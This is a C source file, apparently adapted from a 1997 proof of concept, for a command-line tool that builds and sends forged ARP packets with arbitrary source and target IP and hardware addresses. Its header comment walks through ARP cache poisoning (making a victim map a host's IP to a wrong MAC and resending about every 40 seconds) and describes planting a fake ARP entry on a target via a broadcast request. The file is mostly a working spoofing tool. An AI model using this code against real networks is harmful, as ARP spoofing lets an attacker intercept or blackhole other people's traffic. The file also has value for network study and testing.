/*
 * =====================================================================================
 *
 *       Filename:  send_arp.c
 *
 *    Description:  http://usuaris.tinet.cat/sag/send_arp.htm
 *
 *        Version:  1.0
 *        Created:  01/10/2014 10:03:52 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Wei Yang (weiyang), weiyang.kernel@gmail.com
 *        Company:  
 *
 * =====================================================================================
 */
/* send_arp.c

This program sends out one ARP "reply" packet with source/target IP and Ethernet hardware addresses suuplied by the user.  
It compiles and works on Linux and will probably work on any Unix that has SOCK_PACKET.

The idea behind this program is a proof of a concept, nothing more.  It comes as is, no warranty.
However, you're allowed to use it under one condition: you must use your brain simultaneously.  
If this condition is not met, you shall forget about this program and go RTFM immediately.

yuri volobuev'97
volobuev@t1.chem.umn.edu

IP          10.0.0.1   10.0.0.2  10.0.0.3  10.0.0.4
hostname       cat        rat       dog       bat
hw addr       AA:AA      BB:BB     CC:CC     DD:DD

You, bat, want dog to believe that rat's hardware address is that of cat (AA:AA), 
so you send ARP reply with 
  source IP 10.0.0.2,             machine which is suposed to receive traffic (as DGW)
  source hw address AA:AA,        wrong MAC - the MAC that will effectivelly receive traffic
  target IP address 10.0.0.3,     destination IP, machine to be spoofed, blinded
  target hardware address CC:CC.  destination MAC of this message
  
Now, for all dog knows, rat is at AA:AA. 

Cache entry would expire, of course, so it needs to be updated (request needs to be resent).  
How often depends on the particular system, but every 40 sec or so should be sufficient for most cases.

Fake an arp entry in the subnet:

As current linux kernel(3.13), when receive an arp request to itself, it will add
and neighbour entry in arp table. But it will not check whether it is real or not.

This means you could fake an arp entry in the subnet like:

   ./send_arp fake_slef_ip self_mac target_ip ff:ff:ff:ff:ff:ff

Then on the target_ip machine, there would be an fake_self_ip arp entry.

Could this be an attack? Need to check later.

*/

#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

// replace following by
// #include 
// for windows migrating start ...

#include <netdb.h>
#include <sys/socket.h>
// --- not required by RH --- #include <linux/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>

// http://en.wikipedia.org/wiki/Address_Resolution_Protocol
//   hlen          - Ethernet addresses size is 6.
//   plen          - IPv4 address size is 4.
//   frtype        - 0x0806 = ARP - http://en.wikipedia.org/wiki/EtherType
//   htype         - Ethernet is 1.
//   Protocol type - for IPv4, this has the value 0x0800
//   Operation     - specifies the operation that the sender is performing: 1 for request, 2 for reply.

#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN     4
#define ARP_FRAME_TYPE  0x0806
#define ETHER_HW_TYPE   1
#define IP_PROTO_TYPE   0x0800
#define OP_ARP_REQUEST  1
#define OP_ARP_REPLY    2

#define DEFAULT_DEVICE "wlan0"

char usage[]={"send_arp: sends out custom ARP packet. yuri volobuev'97\n\
\tusage: send_arp src_ip_addr src_hw_addr targ_ip_addr tar_hw_addr\n\n"};

struct arp_packet{
	char    targ_hw_addr[ETH_HW_ADDR_LEN];
	char    src_hw_addr[ETH_HW_ADDR_LEN];
	short   frame_type;
	short   hw_type;
	short   prot_type;
	char    hw_addr_size;
	char    prot_addr_size;
	short   op;
	char    sndr_hw_addr[ETH_HW_ADDR_LEN];
	char    sndr_ip_addr[IP_ADDR_LEN];
	char    rcpt_hw_addr[ETH_HW_ADDR_LEN];
	char    rcpt_ip_addr[IP_ADDR_LEN];
	char    padding[18];
};

void die(char *);
void get_ip_addr(struct in_addr*, char*);
void get_hw_addr(char*, char*);

int main(int argc, char** argv)
{
	struct in_addr src_in_addr, targ_in_addr;
	struct arp_packet pkt;
	struct sockaddr sa;
	int sock;

	if (argc != 5) 
		die(usage) ;

	sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
	if ( sock < 0 ){
		perror("socket");
		exit(1);
	}

	pkt.frame_type     = htons(ARP_FRAME_TYPE);
	pkt.hw_type        = htons(ETHER_HW_TYPE);
	pkt.prot_type      = htons(IP_PROTO_TYPE);
	pkt.hw_addr_size   = ETH_HW_ADDR_LEN;
	pkt.prot_addr_size = IP_ADDR_LEN;
	pkt.op             = htons(OP_ARP_REQUEST);

	get_hw_addr(pkt.targ_hw_addr, argv[4]);
	get_hw_addr(pkt.rcpt_hw_addr, argv[4]);
	get_hw_addr(pkt.src_hw_addr,  argv[2]);
	get_hw_addr(pkt.sndr_hw_addr, argv[2]);

	get_ip_addr(&src_in_addr, argv[1]);
	get_ip_addr(&targ_in_addr, argv[3]);

	memcpy(pkt.sndr_ip_addr, &src_in_addr,  IP_ADDR_LEN);
	memcpy(pkt.rcpt_ip_addr, &targ_in_addr, IP_ADDR_LEN);

	bzero(pkt.padding, 18);

	strcpy(sa.sa_data, DEFAULT_DEVICE) ;
	if ( sendto( sock, &pkt,sizeof(pkt), 0, &sa,sizeof(sa) ) < 0 ){
	  perror("sendto");
	  exit(1);
	}
	return 0;
}

void die(char* str)
{
	fprintf(stderr,"%s\n",str);
	exit(1);
}

void get_ip_addr( struct in_addr* in_addr, char* str )
{
	struct hostent *hostp;

	in_addr->s_addr = inet_addr(str);
	if ( in_addr->s_addr == -1 ){
		if( (hostp = gethostbyname(str)))
			bcopy(hostp->h_addr, in_addr, hostp->h_length) ;
		else {
			fprintf(stderr, "send_arp: unknown host [%s].\n", str);
			exit(1);
		}
	}
}

/* Convert a mac string to digit */
void get_hw_addr(char* buf, char* str)
{
	int i;
	char c, val;

	for ( i=0 ; i < ETH_HW_ADDR_LEN ; i++ ){
		if(!(c = tolower(*str++)))
			die("Invalid hardware address");
		if(isdigit(c))
			val = c-'0';
		else if(c >= 'a' && c <= 'f')
			val = c-'a'+10;
		else
			die("Invalid hardware address");

		*buf = val << 4;

		if( !(c = tolower(*str++)))
			die("Invalid hardware address");
		if(isdigit(c))
			val = c-'0';
		else if(c >= 'a' && c <= 'f')
			val = c-'a'+10;
		else
			die("Invalid hardware address");

		*buf++ |= val;

		if (*str == ':') 
			str++;
	}
}

